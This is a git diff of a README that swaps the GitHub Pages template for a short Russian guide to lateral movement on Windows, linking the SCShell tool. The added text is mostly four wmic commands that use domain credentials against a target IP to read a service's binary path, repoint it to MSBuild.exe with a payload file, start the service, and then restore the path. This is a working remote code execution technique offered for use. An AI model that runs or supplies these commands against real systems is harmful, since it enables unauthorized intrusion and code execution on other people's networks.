@@ -1,37 +1,19 @@
-## Welcome to GitHub Pages
+## Двигаемся боком
 
-You can use the [editor on GitHub](https://github.com/Ondrik8/lateral_movement/edit/master/README.md) to maintain and preview the content for your website in Markdown files.
+для этого есть прeкрасный [инструмент](https://github.com/SpiderLabs/SCShell)
 
-Whenever you commit to this repository, GitHub Pages will run [Jekyll](https://jekyllrb.com/) to rebuild the pages in your site, from the content in your Markdown files.
+Шаг 1: Получите текущее pathName вашей целевой службы, чтобы мы могли восстановить его после запуска нашей команды (в нашем случае XblAuthManager)
 
-### Markdown
+`wmic /user:DOMAIN\USERNAME /password:PASSWORD /node:TARGET_IP service where name='XblAuthManager' get pathName`
 
-Markdown is a lightweight and easy-to-use syntax for styling your writing. It includes conventions for
+Шаг 2: Измените pathName на любую команду, которую вы хотите запустить
 
-```markdown
-Syntax highlighted code block
+`wmic /user:DOMAIN\USERNAME /password:PASSWORD /node:TARGET_IP service where name='XblAuthManager' call change PathName="C:\Windows\Microsoft.Net\Framework\v4.0.30319\MSBuild.exe C:\testPayload.xml"`
 
-# Header 1
-## Header 2
-### Header 3
+Шаг 3: Запустите измененный сервис
 
-- Bulleted
-- List
+`wmic /user:DOMAIN\USERNAME /password:PASSWORD /node:TARGET_IP service where name='XblAuthManager' call startservice`
 
-1. Numbered
-2. List
+Шаг 4. Измените путь службы до ее первоначального значения.
 
-**Bold** and _Italic_ and `Code` text
-
-[Link](url) and ![Image](src)
-```
-
-For more details see [GitHub Flavored Markdown](https://guides.github.com/features/mastering-markdown/).
-
-### Jekyll Themes
-
-Your Pages site will use the layout and styles from the Jekyll theme you have selected in your [repository settings](https://github.com/Ondrik8/lateral_movement/settings). The name of this theme is saved in the Jekyll `_config.yml` configuration file.
-
-### Support or Contact
-
-Having trouble with Pages? Check out our [documentation](https://help.github.com/categories/github-pages-basics/) or [contact support](https://github.com/contact) and we’ll help you sort it out.
+`wmic /user:DOMAIN\USERNAME /password:PASSWORD /node:TARGET_IP service where name='XblAuthManager' call change PathName="C:\Windows\system32\svchost.exe -k netsvcs"`
